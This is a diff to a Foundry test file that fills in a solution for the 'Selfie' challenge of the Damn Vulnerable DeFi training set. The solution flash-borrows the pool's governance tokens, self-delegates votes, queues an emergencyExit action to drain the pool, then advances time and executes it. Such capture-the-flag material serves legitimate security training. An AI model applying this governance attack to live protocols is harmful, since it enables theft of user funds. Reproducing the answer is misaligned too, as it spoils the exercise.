@@ -2,10 +2,15 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
+import {Votes} from "@openzeppelin/contracts/governance/utils/Votes.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -58,11 +63,28 @@ contract SelfieChallenge is Test {
         assertEq(pool.flashFee(address(token), 0), 0);
     }
 
+    function onFlashLoan(address initiator,
+        address _token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+        token.delegate(player);
+        vm.startPrank(player);
+        governance.queueAction(address(pool), 0, data);
+        vm.stopPrank();
+        IERC20(_token).approve(msg.sender, amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        bytes memory data = abi.encodeWithSelector(pool.emergencyExit.selector,recovery);
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), TOKENS_IN_POOL, data);
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(1);
     }
 
     /**
